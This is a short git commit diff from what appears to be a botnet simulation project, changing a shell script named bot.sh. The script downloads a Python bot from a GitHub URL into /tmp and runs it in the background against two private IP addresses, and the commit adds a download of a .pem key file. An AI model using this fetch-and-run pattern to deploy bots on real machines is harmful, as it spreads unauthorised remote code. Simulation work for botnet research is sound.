ebda7bdd8d3a268ea7d8be2ccfead853476f0a2f
rhishi <rhishi.16@gmail.com>
2019-08-25 18:25:57 +0800

    Ubuntu bot updates.

--- bot/bot.sh
+++ bot/bot.sh
@@ -6,5 +6,6 @@ then
 else 
     echo "Starting process."
     /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/bot_1.py > /tmp/bot.py
+    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/bot/rps.pem > /tmp/rps.pem
     python3 /tmp/bot.py 172.16.135.194 192.168.1.99 &
 fi
